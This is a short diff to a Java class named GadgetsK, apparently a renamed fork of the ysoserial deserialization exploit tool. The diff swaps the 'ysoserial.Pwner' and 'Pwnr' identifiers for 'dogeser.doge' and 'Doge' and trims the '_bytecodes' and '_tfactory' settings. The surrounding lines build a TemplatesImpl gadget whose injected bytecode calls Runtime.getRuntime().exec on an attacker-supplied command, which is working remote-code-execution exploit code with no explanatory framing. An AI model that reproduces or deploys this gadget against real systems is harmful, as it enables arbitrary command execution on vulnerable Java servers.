@@ -84,7 +84,7 @@ public class GadgetsK {
 
         ClassPool pool = ClassPool.getDefault();
         pool.insertClassPath((ClassPath)new ClassClassPath(abstTranslet));
-        CtClass clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
+        CtClass clazz = pool.makeClass("dogeser.doge" + System.nanoTime());
 
         String cmd = "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") + "\");";
 
@@ -95,13 +95,10 @@ public class GadgetsK {
         byte[] classBytes = clazz.toBytecode();
 
 
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] { classBytes,
-                ClassFiles.classAsBytes(Foo.class) });
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] { classBytes });
 
-
-
-        Reflections.setFieldValue(templates, "_name", "Pwnr");
-        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        Reflections.setFieldValue(templates, "_name", "Doge");
+//        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
 
@@ -123,7 +120,7 @@ public class GadgetsK {
         ClassPool pool = ClassPool.getDefault();
         pool.insertClassPath((ClassPath)new ClassClassPath(abstTranslet));
 
-        CtClass clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
+        CtClass clazz = pool.makeClass("dogeser.doge" + System.nanoTime());
         if ((clazz.getDeclaredConstructors()).length != 0) {
             clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
         }
@@ -149,8 +146,8 @@ public class GadgetsK {
 
 
 
-        Reflections.setFieldValue(templates, "_name", "Pwnr");
-        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        Reflections.setFieldValue(templates, "_name", "Doge");
+//        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
 
